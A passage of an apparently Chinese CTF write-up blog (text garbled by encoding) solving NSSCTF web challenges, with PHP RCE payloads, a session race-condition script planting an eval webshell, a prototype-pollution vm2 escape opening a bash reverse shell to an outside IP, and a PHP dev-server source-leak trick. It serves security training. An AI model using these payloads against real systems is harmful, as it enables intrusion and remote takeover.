class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ–¹æ³•çœ‹ä¸Šå»æ˜¯æœ‰ä¸¤ç§çš„ï¼Œä¸€ç§æ˜¯æƒ³åŠæ³•rceï¼Œä¸€ç§æ˜¯includeæ¥è¿›è¡Œæ–‡ä»¶åŒ…å«</p><p>æ–¹æ³•ä¸€RCEï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=eval&amp;shell=system(~%93%8C%DF%D0);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172100977.png" alt="image-20241223172100977"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=eval&amp;shell=system(~%91%93%DF%D0%D5);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172424946.png" alt="image-20241223172424946"></p><p>æ–¹æ³•äºŒï¼šsessionæ¡ä»¶ç«äº‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28547/&#x27;</span></span><br><span class="line">sessionid = <span class="string">&#x27;met&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>): <span class="comment"># å†™å…¥ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment"># 50kb</span></span><br><span class="line">        session.post(url, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessionid&#125;, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php file_put_contents(&#x27;/var/www/html/shell.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);?&gt;&quot;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.jpg&#x27;</span>, fileBytes)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.get(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid) <span class="comment"># è¿›è¡Œæ–‡ä»¶åŒ…å«</span></span><br><span class="line">        r = session.get(url+<span class="string">&#x27;shell.php&#x27;</span>) <span class="comment"># æ£€æŸ¥æ˜¯å¦å†™å…¥ä¸€å¥è¯æœ¨é©¬</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">evnet = threading.Event() <span class="comment"># å¤šçº¿ç¨‹</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œæ²¡æˆåŠŸï¼Ÿï¼å¯èƒ½æ˜¯ç¯å¢ƒé—®é¢˜å§æˆ‘è§‰å¾—ã€‚ã€‚ã€‚</p><h2 id="HZNUCTF-2023-final-eznode"><a href="#HZNUCTF-2023-final-eznode" class="headerlink" title="[HZNUCTF 2023 final]eznode"></a>[HZNUCTF 2023 final]eznode</h2><p>æ‰“å¼€è®©æˆ‘ä»¬æ‰¾æºç ï¼Œæ‰«ä¸ªç›®å½•çœ‹çœ‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªvm2å•Šï¼Œå¯èƒ½è·Ÿvm2çš„æ²™ç®±é€ƒé€¸æœ‰å…³ï¼</p><p>å‘ç°ä¸€ä¸ªmergeå‡½æ•°ï¼ŒåŸå‹é“¾æ±¡æŸ“çš„å¸¸å®¢ï¼Œå¤§æ¦‚å°±æ˜¯åœ¨é¡µé¢postä¼ é€’ä¸€ä¸ªjsonæ•°æ®ï¼Œä¼šç»è¿‡json.parseå‡½æ•°è§£æï¼Œç„¶åå†é€šè¿‡clone()å‡½æ•°å¤åˆ¶åˆ°copybodyå˜é‡ä¸­ï¼Œæœ€ååˆ¤æ–­è¯¥å˜é‡çš„shitå€¼æ˜¯å¦ä¸ºçœŸï¼Œç„¶åè°ƒç”¨backdoor()å‡½æ•°åœ¨VM2æ²™ç®±ä¸­æ‰§è¡Œ{}.shellcodeå±æ€§ã€‚</p><p>backdoorå‡½æ•°åˆ©ç”¨vm2æ‰§è¡Œshellcodeï¼Œè¿™ä¸ªshellcodeå…¶ä»–åœ°æ–¹æ²¡æœ‰å¾—ä¼ å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“ä¼ é€’shellcodeï¼Œæ±¡æŸ“æˆVM2æ²™ç®±é€ƒé€¸çš„payloadå³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;shit&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(&#x27;return this&#x27;)().process.mainModule.require(&#x27;child_process&#x27;).execSync(\&quot;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/156.238.233.113/4567 0&gt;&amp;1&#x27;\&quot;).toString();&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110506682.png" alt="image-20241224110506682" style="zoom: 67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110501121.png" alt="image-20241224110501121" style="zoom:67%;" /><p>æ‹¿ä¸‹ï¼Œå½“åˆvm2æ²¡çœ‹å•Šï¼ï¼</p><h2 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28575/index.php/utils.php/%81?show[source=1</span><br></pre></td></tr></table></figure><p>â€‹å¥½åƒä¹Ÿå¯ä»¥urlç¼–ç ç»•è¿‡ï¼Ÿï¼</p><h2 id="FSCTF-2023-ç­¾åˆ°plus"><a href="#FSCTF-2023-ç­¾åˆ°plus" class="headerlink" title="[FSCTF 2023]ç­¾åˆ°plus"></a>[FSCTF 2023]ç­¾åˆ°plus</h2><p>æ‰«æºç æ‰«åˆ°ä¸€ä¸ªshell.php</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225153946378.png" alt="image-20241225153946378" style="zoom:80%;" /><p>ç„¶åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå‡çš„flag</p><p>å»æŸ¥ä¸€ä¸€ä¸‹è¿™ä¸ªphpç‰ˆæœ¬ï¼Œå‘ç°æœ‰æ¼æ´</p><p>PHPï¼œ&#x3D;7.4.21 Development Serveræºç æ³„éœ²æ¼æ´</p><p>PHP&lt;&#x3D;7.4.21æ—¶é€šè¿‡<code>php -S</code>å¼€èµ·çš„WEBæœåŠ¡å™¨å­˜åœ¨æºç æ³„éœ²æ¼æ´ï¼Œå¯ä»¥å°†PHPæ–‡ä»¶ä½œä¸ºé™æ€æ–‡ä»¶ç›´æ¥è¾“å‡ºæºç </p><p><a href="https://blog.csdn.net/weixin_46203060/article/details/129350280">https://blog.csdn.net/weixin_46203060/article/details/129350280</a></p><p><a href="https://buaq.net/go-147962.html">https://buaq.net/go-147962.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åŸç†ï¼š</span><br><span class="line">  è¿™é‡Œæˆ‘ä»¬ç¨å¾®è§£é‡Šä¸€ä¸‹ç¬¬ä¸€ä¸ªGETå’Œç¬¬äºŒä¸ªGETçš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆ</span><br><span class="line">        ç¬¬ä¸€ä¸ªGETåçš„/phpinfo.phpæ˜¯ç›´æ¥è®¿é—®å·²å­˜åœ¨çš„phpinfo.phpæ–‡ä»¶(ä¸€èˆ¬å¯ä»¥æ˜¯è®¿é—®index.php)</span><br><span class="line">PHPæºç ä¸­çš„php_cli_server_request_translate_vpathå‡½æ•°å°†è¯·æ±‚çš„PHPæ–‡ä»¶çš„è·¯å¾„è½¬æ¢ä¸ºæ–‡ä»¶ç³»ç»Ÿä¸Šçš„å®Œæ•´è·¯å¾„ã€‚å¦‚æœè¯·æ±‚çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå®ƒä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç´¢å¼•æ–‡ä»¶ï¼Œå¦‚index.phpæˆ– index.htmlï¼Œå¹¶ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„(å¦‚æœæ‰¾åˆ°çš„è¯)ã€‚è¿™å…è®¸æœåŠ¡å™¨å“åº”è¯·æ±‚æä¾›æ­£ç¡®çš„æ–‡ä»¶</span><br><span class="line">        è€Œç¬¬äºŒä¸ªGETåçš„/è¯·æ±‚çš„æ˜¯ç›®å½•è€Œä¸æ˜¯æ–‡ä»¶ã€‚æ­¤PHPç‰ˆæœ¬æä¾›çš„ä»£ç åŒ…æ‹¬ä¸€ä¸ªæ£€æŸ¥ï¼Œä»¥ç¡®å®šè¯·æ±‚çš„æ–‡ä»¶æ˜¯åº”è¢«è§†ä¸ºé™æ€æ–‡ä»¶è¿˜æ˜¯ä½œä¸ºPHPæ–‡ä»¶æ‰§è¡Œã€‚è¿™æ˜¯é€šè¿‡æ£€æŸ¥æ–‡ä»¶çš„æ‰©å±•åæ¥å®Œæˆçš„ã€‚å¦‚æœæ‰©å±•ä¸æ˜¯.phpæˆ–.PHPï¼Œæˆ–è€…å¦‚æœæ‰©å±•åçš„é•¿åº¦ä¸ç­‰äº3,åˆ™è¯¥æ–‡ä»¶è¢«è§†ä¸ºé™æ€æ–‡ä»¶ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æŠŠç¬¬äºŒä¸ªGETè¯·æ±‚çš„å†…å®¹æ”¹ä¸ºç±»ä¼¼1.txtçš„æ–‡ä»¶æ—¶ï¼Œphpæºç å°†ä¼šè¢«ä»¥é™æ€æ–‡ä»¶çš„æ–¹å¼æ³„éœ²(å³ç›´æ¥è®¿é—®è·å–)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155117505.png" alt="image-20241225155117505"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155204995.png" alt="image-20241225155204995"></p><p>ç›´æ¥æ‹¿ä¸‹äº†ã€‚</p><h2 id="CISCN-2022-åˆèµ›-online-crt"><a href="#CISCN-2022-åˆèµ›-online-crt" class="headerlink" title="[CISCN 2022 åˆèµ›]online_crt"></a>[CISCN 2022 åˆèµ›]online_crt</h2><p>ç»™äº†æˆ‘ä»¬æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span 